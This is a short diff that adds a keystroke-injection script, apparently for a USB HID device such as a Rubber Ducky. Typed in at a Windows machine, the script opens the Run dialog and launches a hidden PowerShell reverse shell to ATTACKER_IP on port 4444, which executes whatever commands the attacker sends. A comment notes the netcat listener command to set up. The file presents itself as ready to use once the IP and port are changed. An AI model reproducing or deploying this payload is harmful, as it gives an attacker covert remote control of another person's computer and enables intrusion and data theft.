@@ -1,0 +1,8 @@
+REM PowerShell reverse shell - CHANGE IP AND PORT BEFORE USE
+REM Set up listener: nc -lvnp 4444
+DEFAULT_DELAY 100
+DELAY 500
+GUI r
+DELAY 800
+STRING powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
+ENTER
